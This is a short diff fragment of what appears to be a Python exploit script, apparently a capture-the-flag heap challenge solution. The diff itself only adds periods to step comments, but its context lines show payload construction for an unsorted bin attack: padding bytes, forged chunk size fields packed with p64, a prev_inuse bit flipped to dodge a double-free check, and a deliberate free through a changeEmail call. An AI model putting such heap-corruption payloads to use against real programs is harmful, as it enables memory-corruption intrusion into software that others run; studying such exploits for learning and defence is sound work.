@@ -534,7 +534,7 @@ def exploit(r):
 
     # Step 2. -- Unsorted bin attack  
     log.info("starting Unsorted Bin Attack...")
-    # Step 2.1
+    # Step 2.1.
     payload  = "D"*8*16   
     payload += "D"*8
     payload += p64(0x91)
@@ -543,11 +543,11 @@ def exploit(r):
     payload += p64(0x101) # flip prev_inuse bit back on to avoid causing double free 
     changeName(payload)   # total payload size = 288 = 0x120
     
-    # Step 2.2
+    # Step 2.2.
     changeEmail("") # free(B)    
     
     processRound()
-    # Step 2.3
+    # Step 2.3.
     payload  = "D"*8*16   
     payload += "D"*8
     payload += p64(0x91)
